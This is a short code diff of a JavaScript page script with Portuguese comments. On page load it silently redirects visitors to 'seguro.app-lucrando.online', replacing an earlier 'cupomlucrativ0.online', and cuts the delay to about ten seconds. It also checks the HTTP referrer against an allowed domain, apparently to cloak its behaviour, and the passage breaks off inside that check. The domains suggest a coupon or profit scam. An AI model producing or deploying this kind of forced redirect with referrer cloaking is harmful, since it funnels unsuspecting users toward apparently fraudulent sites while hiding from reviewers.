@@ -1,16 +1,16 @@
 window.onload = function() {
-    var numeroTelefone = "cupom";
+    var numeroTelefone = "safe";
     var mensagem = "Olá!";
-    var link = "https://cupomlucrativ0.online/cupomcerto/" + numeroTelefone;
+    var link = "https://seguro.app-lucrando.online/" + numeroTelefone;
     
     setTimeout(function() {
       window.location.href = link;
-    }, 99990);
+    }, 9990);
   }
   var referer = document.referrer;
 
   // Domínio permitido
-  var dominioPermitido = 'cupomlucrativ0.online';
+  var dominioPermitido = 'https://seguro.app-lucrando.online/';
   
   // Verifica se o referer corresponde ao domínio permitido
   if (referer && referer.indexOf(dominioPermitido) === -1) {
